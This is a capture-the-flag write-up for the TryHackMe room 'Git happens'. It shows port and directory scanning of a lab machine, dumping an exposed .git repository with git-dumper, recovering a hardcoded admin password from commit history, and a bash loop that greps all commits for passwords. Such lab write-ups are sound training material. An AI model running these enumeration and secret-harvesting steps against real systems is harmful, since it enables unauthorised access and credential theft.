# Room: Git happens

## General Info
- **Room link:** [Git happens](https://tryhackme.com/room/githappens)

## Description

Can you find the password to the application?

## Provided Files / Links
- [x] Target Machine IP (10.10.120.233)

## Enumeration / Recon

- Port Enumeration:
` nmap -sV 10.10.120.233 -p- -T5`

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
```


- Directory Enumeration


```
gobuster dir -u http://10.10.120.233 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -t 100
```

```
/index.html           (Status: 200) [Size: 6890]
/.                    (Status: 301) [Size: 194] [--> http://10.10.120.233/./]
/.git                 (Status: 301) [Size: 194] [--> http://10.10.120.233/.git/]
/dashboard.html       (Status: 200) [Size: 3775]
```


## Website exploitation

The website http://10.10.120.233 starts with a login page.

Since I found a .git repository on the server, I am going to use git_dumper (https://github.com/arthaud/git-dumper) to dump the repository from the website on my machine.

`python3 git_dumper.py http://10.10.120.233/.git/ dumped-repo`

There is an interesting commit "Made the login page, boss!" (`git log`), when checking the content of the index.html file, I find login credentials: 

```
<script>
      function login() {
        let form = document.getElementById("login-form");
        console.log(form.elements);
        let username = form.elements["username"].value;
        let password = form.elements["password"].value;
        if (
          username === "admin" &&
          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
        ) {
          document.cookie = "login=1";
          window.location.href = "/dashboard.html";
        } else {
          document.getElementById("error").innerHTML =
            "INVALID USERNAME OR PASSWORD!";
        }
      }
    </script>
```

Bonus
---
 
I created a bash script to check for all "password" instances in the different files that are commited in the repository:

```
git rev-list --all | while read commit; do
  git ls-tree -r --name-only "$commit" | while read file; do
    git show "$commit:$file" 2>/dev/null | grep -Ei "password" && echo "Found in $file at $commit"
  done
done
```

```
<label class="lf--label" for="password">
          id="password"
          name="password"
          placeholder="Password"
          type="password"
        let password = form.elements["password"].value;
          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
            "INVALID USERNAME OR PASSWORD!";
Found in index.html at 395e087334d613d5e423cdf8f7be27196a360459
```
